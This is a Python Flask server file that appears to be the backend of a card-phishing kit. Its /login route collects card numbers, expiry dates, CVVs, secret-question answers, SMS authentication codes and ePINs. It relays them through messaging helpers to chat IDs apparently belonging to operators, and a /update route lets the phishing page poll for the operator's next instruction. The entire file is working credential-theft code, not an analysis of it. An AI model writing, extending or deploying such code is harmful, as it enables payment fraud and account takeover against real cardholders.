from flask import Flask, redirect, request, jsonify
from flask_cors import CORS
from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol
from CHAT_ID import MAIN_ID, Egoist
from checker import get_button_by_id
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

DOMEN = 'http://127.0.0.1:5500'


@app.before_request
def log_request_info():
    print('Headers:', request.headers)
    print('Body:', request.get_data())
    print('Args:', request.args)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        print("Received a GET request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        card_number = request.args.get('cardNumber')
        expiry_date = request.args.get('expiryDate')
        cvv = request.args.get('cvv')
        id = request.args.get('id')
        question = request.args.get('question')
        authCode = request.args.get('authCode')
        epin = request.args.get('epinAuthCode')
        session = request.args.get('session')
    elif request.method == 'POST':
        print("Received a POST request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        data = request.get_json()
        card_number = data.get('cardNumber')
        expiry_date = data.get('expiryDate')
        cvv = data.get('cvv')
        id = data.get('id')
        question = data.get('question')
        session = data.get('session')
    ID = f'{session}'

    # WE
    if id == '1000001':
        if question != None and question != 'None' and authCode == None:
            send_secret_question(MAIN_ID, card_number, expiry_date, cvv, question, ID)
            return ''
        if authCode != None and authCode != 'None':
            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, epin, ID)
            return ''
        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID)
        ne_pizdabol(card_number)
        return ''
    # Egoist
    elif id == '1000002':
        if question != None and question != 'None' and authCode == None:
            send_secret_question(Egoist, card_number, expiry_date, cvv, question, ID)
            return ''
        if authCode != None and authCode != 'None':
            send_sms(Egoist, card_number, expiry_date, cvv, authCode, epin, ID)
            return ''
        ne_pizdabol(card_number)
        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID)
        return ''


@app.route('/test', methods=['GET'])
def test():
    return jsonify(number=3)

@app.route('/update', methods=['GET'])
def test2():
    database = r"database.db"
    user_id_to_check = request.args.get('session')  
    result = str(get_button_by_id(user_id_to_check, database))
    return jsonify({'result': result})
if __name__ == '__main__':
    app.run(debug=True)
    
